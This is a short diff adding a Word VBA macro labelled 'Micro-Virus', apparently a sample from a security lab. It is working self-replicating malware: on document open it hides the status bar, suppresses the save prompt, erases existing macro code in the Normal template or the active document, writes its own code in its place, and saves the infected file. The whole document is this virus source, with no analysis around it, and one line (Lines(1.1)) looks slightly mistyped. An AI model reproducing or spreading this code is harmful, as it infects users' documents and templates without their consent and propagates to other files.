@@ -1,0 +1,23 @@
+'Micro-Virus
+Sub Document_Open()
+On Error Resume Next
+Application.DisplayStatusBar = False
+Options.SaveNormalPrompt = False
+Ourcode = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 100)
+Set Host = NormalTemplate.VBProject.VBComponents(1).CodeModule
+If ThisDocument = NormalTemplate Then
+    Set Host = ActiveDocument.VBProject.VBComponents(1).CodeModule
+End If
+With Host
+    If .Lines(1.1) <> "'Micro-Virus" Then
+        .DeleteLines 1, .CountOfLines
+        .InsertLines 1, Ourcode
+        .ReplaceLine 2, "Sub Document_Close()"
+        If ThisDocument = NormalTemplate Then
+            .ReplaceLine 2, "Sub Document_Open()"
+            ActiveDocument.SaveAs ActiveDocument.FullName
+        End If
+    End If
+End With
+MsgBox "MicroVirus by Content Security Lab"
+End Sub
